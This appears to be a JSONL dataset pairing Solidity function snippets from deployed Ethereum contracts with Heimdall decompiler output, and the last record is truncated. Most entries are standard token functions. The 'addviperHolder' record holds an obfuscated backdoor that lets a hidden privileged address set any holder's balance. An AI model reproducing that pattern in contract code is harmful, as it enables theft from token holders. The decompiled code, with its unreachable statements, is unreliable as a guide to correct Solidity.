{"contract_address": "0x384D84b0E082987D9f103c1ee2cD101C044a076a", "original_solidity_code": "function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}", "heimdall_decompiled_code": "function transferFrom(address arg0, address arg1, uint256 arg2) public returns (bool) {\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        if (storage_map_c[var_a] < arg2) {\n            if (storage_map_c[var_a] < arg2) {\n                if (storage_map_c[var_a] < arg2) {\n                    uint256 var_c = 0;\n                    return 0;\n                    var_a = address(arg1);\n                    var_b = 0;\n                    storage_map_c[var_a] = storage_map_c[var_a] + arg2;\n                    var_a = address(arg0);\n                    var_b = 0;\n                    storage_map_c[var_a] = storage_map_c[var_a] - arg2;\n                    var_a = address(arg0);\n                    var_b = 0x01;\n                    var_a = address(msg.sender);\n                    var_b = keccak256(var_a);\n                    storage_map_c[var_a] = storage_map_c[var_a] - arg2;\n                    var_c = arg2;\n                    emit Transfer(address(arg0), address(arg1), arg2);\n                    var_c = 0x01;\n                    return 0x01;\n                    if (!arg2 > 0) {\n                        var_a = address(arg1);\n                        var_b = 0;\n                        storage_map_c[var_a] = storage_map_c[var_a] + arg2;\n                        var_a = address(arg0);\n                        var_b = 0;\n                        storage_map_c[var_a] = storage_map_c[var_a] - arg2;\n                        var_a = address(arg0);\n                        var_b = 0x01;\n                        var_a = address(msg.sender);\n                        var_b = keccak256(var_a);\n                        storage_map_c[var_a] = storage_map_c[var_a] - arg2;\n                        var_c = arg2;\n                        emit Transfer(address(arg0), address(arg1), arg2);\n                        var_c = 0x01;\n                        return 0x01;\n                        var_c = 0;\n                        return 0;\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x921bfABc80E240B6e0780De1471110C7bE77d4E7", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x81e8B33fc9ace761BdfB7Ca1335A2D92da204E70", "original_solidity_code": "function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x6f87c7FAc982eB280d81865547aB31fD209b1637", "original_solidity_code": "function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the symbol of the token.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the decimals places of the token.\\n     */\\n    function decimals() external view returns (uint8);\\n}\\n\"\r\n    },\r\n    \"@openzeppelin/contracts/utils/Address.sol\": {\r\n      \"content\": \"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.9.0) (utils/Address.sol)\\n\\npragma solidity ^0.8.1;\\n\\n/**\\n * @dev Collection of functions related to the address type\\n */\\nlibrary Address {\\n    /**\\n     * @dev Returns true if `account` is a contract.\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * It is unsafe to assume that an address for which this function returns\\n     * false is an externally-owned account (EOA) and not a contract.\\n     *\\n     * Among others, `isContract` will return false for the following\\n     * types of addresses:\\n     *\\n     *  - an externally-owned account\\n     *  - a contract in construction\\n     *  - an address where a contract will be created\\n     *  - an address where a contract lived, but was destroyed\\n     *\\n     * Furthermore, `isContract` will also return true if the target contract within\\n     * the same transaction is already scheduled for destruction by `SELFDESTRUCT`,\\n     * which only has an effect at the end of a transaction.\\n     * ====\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\\n     *\\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\\n     * constructor.\\n     * ====\\n     */\\n    function isContract(address account) internal view returns (bool) {\\n        // This method relies on extcodesize/address.code.length, which returns 0\\n        // for contracts in construction, since the code is only stored at the end\\n        // of the constructor execution.\\n\\n        return account.code.length > 0;\\n    }\\n\\n    /**\\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\\n     * `recipient`, forwarding all available gas and reverting on errors.\\n     *\\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\\n     * imposed by `transfer`, making them unable to receive funds via\\n     * `transfer`. {sendValue} removes this limitation.\\n     *\\n     * https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/[Learn more].\\n     *\\n     * IMPORTANT: because control is transferred to `recipient`, care must be\\n     * taken to not create reentrancy vulnerabilities. Consider using\\n     * {ReentrancyGuard} or the\\n     * https://solidity.readthedocs.io/en/v0.8.0/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\\n     */\\n    function sendValue(address payable recipient, uint256 amount) internal {\\n        require(address(this).balance >= amount, \\\"Address: insufficient balance\\\");\\n\\n        (bool success, ) = recipient.call{value: amount}(\\\"\\\");\\n        require(success, \\\"Address: unable to send value, recipient may have reverted\\\");\\n    }\\n\\n    /**\\n     * @dev Performs a Solidity function call using a low level `call`. A\\n     * plain `call` is an unsafe replacement for a function call: use this\\n     * function instead.\\n     *\\n     * If `target` reverts with a revert reason, it is bubbled up by this\\n     * function (like regular Solidity function calls).\\n     *\\n     * Returns the raw returned data. To convert to the expected return value,\\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\\n     *\\n     * Requirements:\\n     *\\n     * - `target` must be a contract.\\n     * - calling `target` with `data` must not revert.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, \\\"Address: low-level call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\\n     * `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but also transferring `value` wei to `target`.\\n     *\\n     * Requirements:\\n     *\\n     * - the calling contract must have an ETH balance of at least `value`.\\n     * - the called Solidity function must be `payable`.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, value, \\\"Address: low-level call with value failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(\\n        address target,\\n        bytes memory data,\\n        uint256 value,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        require(address(this).balance >= value, \\\"Address: insufficient balance for call\\\");\\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\\n        return functionStaticCall(target, data, \\\"Address: low-level static call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.staticcall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionDelegateCall(target, data, \\\"Address: low-level delegate call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.delegatecall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\\n     *\\n     * _Available since v4.8._\\n     */\\n    function verifyCallResultFromTarget(\\n        address target,\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        if (success) {\\n            if (returndata.length == 0) {\\n                // only check isContract if the call was successful and the return data is empty\\n                // otherwise we already know that it was a contract\\n                require(isContract(target), \\\"Address: call to non-contract\\\");\\n            }\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\\n     * revert reason or using the provided one.\\n     *\\n     * _Available since v4.3._\\n     */\\n    function verifyCallResult(\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal pure returns (bytes memory) {\\n        if (success) {\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    function _revert(bytes memory returndata, string memory errorMessage) private pure {\\n        // Look for revert reason and bubble it up if present\\n        if (returndata.length > 0) {\\n            // The easiest way to bubble the revert reason is using memory via assembly\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                let returndata_size := mload(returndata)\\n                revert(add(32, returndata), returndata_size)\\n            }\\n        } else {\\n            revert(errorMessage);\\n        }\\n    }\\n}\\n\"\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_i) {\n            if (!(store_i) == ((store_i >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_i >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_i >> 0x01;\n                if (store_i) {\n                    if (!(store_i) == ((store_i >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_i >> 0x01) {\n                            if (0x1f < (store_i >> 0x01)) {\n                                var_a = 0x03;\n                                var_e = storage_map_e[var_a];\n                                if ((0x20 + var_c) + (store_i >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xEea644890623CdfBD648027cbf819A3C8e48C924", "original_solidity_code": "function isExcludedFromFee(address account) public view returns (bool) {\r\n        return _isExcludedFromFee[account];\r\n    }", "heimdall_decompiled_code": "function isExcludedFromFee(address arg0) public view returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x1b;\n        address var_c = !(!bytes1(storage_map_b[var_a]));\n        return !(!bytes1(storage_map_b[var_a]));\n    }"}
{"contract_address": "0x30045aA941FF9Be1d2D3603A75207C07860d4156", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(\\r\\n            newOwner != address(0),\\r\\n            \\\"Ownable: new owner is the zero address\\\"\\r\\n        );\\r\\n        _transferOwnership(newOwner);\\r\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(address(owner), address(arg0));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x31F2C94D3EF63551FF418747EbBe67E5A083aDC0", "original_solidity_code": "function removeLimits() external onlyOwner {\\n        _maxTxAmount = _tTotal;\\n        _maxWalletSize = _tTotal;\\n        transferDelayEnabled = false;\\n        emit MaxTxAmountUpdated(_tTotal);\\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x12) {\n            if (!0x05f5e100 | (0x01 == 0x01)) {\n                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_g = 0x11;\n                _maxTxAmount = 0x05f5e100;\n                if (0x12) {\n                    if (!0x05f5e100 | (0x01 == 0x01)) {\n                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_g = 0x11;\n                        _maxWalletSize = 0x05f5e100;\n                        transferDelayEnabled = (0 * 0x01) | (uint248(transferDelayEnabled));\n                        if (0x12) {\n                            if (!0x05f5e100 | (0x01 == 0x01)) {\n                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_g = 0x11;\n                                var_a = 0x05f5e100;\n                                emit MaxTxAmountUpdated(0x05f5e100);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x12 > 0xff) {\n                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_g = 0x11;\n                                                if (!0x040000 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                    var_g = 0x11;\n                                                    if (!((0x0a < 0x0b) & (0x12 < 0x4e)) | ((0x0a < 0x0133) & (0x12 < 0x20))) {\n                                                        if (!0x12 > 0x01) {\n                                                            if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_g = 0x11;\n                                                                if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                    var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                    var_g = 0x11;\n                                                                    if (!0) {\n                                                                    }\n                                                                    if (!0x0de0b6b3a7640000 > 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) {\n                                                                        var_f = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                        var_g = 0x11;\n                                                                    }\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x912Abb1B9600d25937CAb8797A3CD5235bf2aAd5", "original_solidity_code": "function transferOwnership(address newOwner) public virtual onlyOwner {\\n        owner = newOwner;\\n\\n        emit OwnershipTransferred(msg.sender, newOwner);\\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"UNAUTHORIZED\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x0c;\n        var_d = 0x554e415554484f52495a45440000000000000000000000000000000000000000;\n        owner = (address(arg0)) | (uint96(owner));\n        emit OwnershipTransferred(msg.sender, address(arg0));\n    }"}
{"contract_address": "0x5Ba89777D1172C70F410d74dBBeF55150B44Da28", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xD2c38aE96629303Ac23fc9931CDa17E023Da3453", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xeA1F21c4f9BDA00BEDB5871E6C0de6746E1e2929", "original_solidity_code": "function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }", "heimdall_decompiled_code": "function allowance(address arg0, address arg1) public view returns (uint256) {\n        address var_a = address(arg0);\n        var_b = 0x02;\n        var_a = address(arg1);\n        address var_b = keccak256(var_a);\n        address var_c = storage_map_d[var_a];\n        return storage_map_d[var_a];\n    }"}
{"contract_address": "0x6ddfeC08B7597e9392abbC41CB8a74A0d59188C1", "original_solidity_code": "function checkUserBoughtAmount(address _user) external view returns (uint256) {\r\n        return boughtAmount[_user];\r\n    }", "heimdall_decompiled_code": "function checkUserBoughtAmount(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x0f;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x4103F78C623459b3e985dE5F5d78622944B9dE6D", "original_solidity_code": "function unblockBot(address notbot) public onlyOwner {\r\n        bots[notbot] = false;\r\n    }", "heimdall_decompiled_code": "function unblockBot(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x10;\n        storage_map_c[var_e] = uint248(storage_map_c[var_e]);\n    }"}
{"contract_address": "0x94a1FaF408D4F4a74e46973BF75953dB44EcA193", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_d[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_d[var_a] = storage_map_d[var_a] - arg1;\n        uint256 var_c = storage_map_d[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_d[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x5a913264FF9a427e0452acB8f522E8202CBB6234", "original_solidity_code": "function setOperator(address _operatorAddress) external onlyOwner {\\n        operatorAddress = _operatorAddress;\\n        emit NewOperatorAddress(msg.sender, _operatorAddress);\\n    }", "heimdall_decompiled_code": "function setOperator(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        operatorAddress = (address(arg0)) | (uint96(operatorAddress));\n        emit NewOperatorAddress(msg.sender, address(arg0));\n    }"}
{"contract_address": "0x210a768a5146f4d3C1068bB37dD780304c6D648D", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x4a4571840601e53dC0f99F0b58AdCC14B601e418", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x4d940f5C7f67BcD5997a27F9E3b97028B226e292", "original_solidity_code": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }", "heimdall_decompiled_code": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }"}
{"contract_address": "0x67971F0972C03651ab6355eF0ae08c850742614a", "original_solidity_code": "function approve(address spender, uint256 amount) external override returns (bool) {\\r\\n      _approve(msg.sender, spender, amount);\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_f[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x22;\n        var_g = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_e)) - (0x04 + var_e);\n        var_f = 0x24;\n        var_g = this.code[3276:3312];\n    }"}
{"contract_address": "0x81e8B33fc9ace761BdfB7Ca1335A2D92da204E70", "original_solidity_code": "function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 